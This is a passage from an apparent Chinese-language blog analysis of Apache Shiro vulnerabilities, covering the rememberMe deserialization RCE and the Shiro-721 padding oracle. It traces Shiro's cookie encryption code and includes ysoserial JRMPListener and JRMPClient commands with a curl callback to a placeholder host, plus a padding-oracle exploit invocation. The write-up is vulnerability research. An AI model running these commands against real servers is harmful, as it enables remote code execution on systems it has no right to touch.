@@ -1,0 +1,87 @@
+          /Library/Java/JavaVirtualMachines/1.6.0.jdk/
+再编译就能成功了：
+将这个war包放到tomcat的webapp目录下，然后访问`http://127.0.0.1:8080/shiro/`会自动解压：
+也可以把它导到idea里打包，接着配置idea，这里踩了坑EDU版本是没有tomcat server的，一定要用旗舰版：
+###  漏洞复现
+EXP打ysoserial的二链：[shiro1.2.4RCE](media/15832217572390/shiro1.2.4RCE.py)
+###  代码分析
+####  加密
+先下个断点：org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin，去login.jsp登录root
+secret，选中Remember Me。
+在`forgetIdentity`函数中处理了request和response请求，在response中处理remember me的cookie。
+再跟进`rememberIdentity`函数：
+调用`convertPrincipalsToBytes`将账户信息传入，先是进行序列化，再来一个加密：
+跟进`encrypt`函数：
+`getCipherService`先获取了一下加密服务的配置信息，包括加密模式，填充方式，加密类型等等：
+`cipherService.encrypt`
+其中秘钥在AbstractRememberMeManager.java中设置的一个定值：
+通过构造方法设置的：
+在加密过程中需要关注的一个点，将iv向量放置在密文头部：org/apache/shiro/crypto/JcaCipherService.java
+加密完成后，返回结果传入`rememberSerializedIdentity`函数，处理http请求，返回cookie到response中：
+到这里cookie加密处理就结束了，再来跟一下是如何解密cookie的。
+####  解密
+org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals
+先从`getRememberedSerializedIdentity`函数获取cookie，base64解码：
+然后进入`convertBytesToPrincipals`函数，先是解密，接着反序列化
+###  坑点：反序列化限制
+网上大部分文章都是拿common-collections2这调链来复现，畅通无阻。
+我们来试试其他链，把gadget换成ysoserial5打shiro自带的`commons-collections-3.2.1`，会抛出这样一个错误：
+再把其组件拉出来单独试试：
+调试分析一下：org/apache/shiro/io/DefaultSerializer.java
+跟进`ClassResolvingObjectInputStream`类：org/apache/shiro/io/ClassResolvingObjectInputStream.java
+他继承了`ObjectInputStream`类，重写了`resolveClass`方法，再来看一下原版`resolveClass`方法：
+`Class.forName`和`ClassUtils.forName`的差别，来看看`ClassUtils`具体实现：org/apache/shiro/util/ClassUtils.java#forName
+shiro不是像原版那样通过`java.lang.Class`反射获取class，而是通过`ParallelWebappClassLoader`去加载class
+查了一些下资料，看到[orange师傅文章](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)评论中说不支持装载数组类型，这里没细跟原因了。
+####  JRMP绕过
+[Orang师傅在文章](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)中一顿操作，发现JRMP可以避开上述限制，测试一下：
+server：
+    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'curl http://x.x.x.x:8989'
+client:
+    java -jar ysoserial.jar JRMPClient 'x.x.x.x:12345'
+稍微调了一下EXP,大概能行的原因就是走的远程的class加载的，而不是像之前那样直接打本地：
+不过有一点比较困惑，用URLDNS打了没结果，但是直接用5链JRMP打却可以…
+## Shiro Padding Oracle攻击（Shiro  JRMPClient
+服务端起一个jrmplistener
+    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections2 'curl http://x.x.x.x:8989'
+    python2 shiro_padding_oracle.py http://127.0.0.1:8088/samples_web_war_exploded/index.jsp [rememberMe的cookie] JRMPClien
+###  漏洞分析
+先来看看这个版本对秘钥的处理：org/apache/shiro/mgt/AbstractRememberMeManager.java
+一直跟进，可以看到将之前的硬编码秘钥换成了动态生成：
+####  padding错误
+在我们给rememberMe输入错误的padding后，经过上文提到的解密过程后，会抛出异常:/org/apache/shiro/crypto/JcaCipherService.class
+然后在org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals捕获
+最后在org/apache/shiro/web/servlet/SimpleCookie.java中给返回包设置一个rememberMe的cookie，覆盖掉之前的值：
+调用栈：
+####  padding正确，反序列化错误
+在之前的padding
+oracle漏洞中，依靠控制前一块密文来伪造后一块的明文，根据Padding的机制，可构造出一个bool条件，从而逐位得到明文，然后逐块得到所有明文。
+也就是说通过padding获取来伪造明文的，会改变前一块的密文，也就是会影响到解密的结果。我们来看shiro中对于解密结果的处理，在DefaultSerializer.class中进行反序列化时，会失败而抛出异常：
+而对于客户端而言，结果是一样的，都走到了AbstractRememberMeManager.java的异常处理：
+接着就是给客户端重置rememberMe的cookie。
+####  拼接序列化数据
+在[gyyy:浅析Java序列化和反序列化](https://xz.aliyun.com/t/3847)这篇文章中介绍了java序列化和反序列化的机制，关键点在于ObjectOutputStream是一个Stream，他会按格式以队列方式读下去，后面拼接无关内容，不会影响反序列化。
+所以现在BOOL条件就出来了，拼接无关数据，padding 正确，能正常反序列化，padding错误抛出异常。
+最后payload的构造就是不断的用两个block去padding得到intermediary之后，构造密文使得解密后得到指定明文，最后拼接到原有的cookie上。
+exp: 
+参考文章：
+  * [分析调试apache shiro反序列化漏洞(CVE-2016-4437)](https://saucer-man.com/information_security/396.html)
+  * [【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞](https://paper.seebug.org/shiro-rememberme-1-2-4/)
+  * [pwn-ctf-platform-with-java-jrmp-gadget](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)
+  * [Exploiting JVM deserialization vulns despite a broken class loader](https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html)
+  * [Shiro 721 Padding Oracle攻击漏洞分析](https://www.anquanke.com/post/id/193165)
+  * [p0:Shiro Padding Oracle Attack 反序列化](https://p0sec.net/index.php/archives/126/)
+[1]:   
+[2]:   
+[3]:   
+[4]:   
+[5]:   
+[6]:   
+[7]:   
+[8]:   
+[9]:   
+[10]:   
+[11]:   
+[12]:   
+[13]:   
+[14]: 
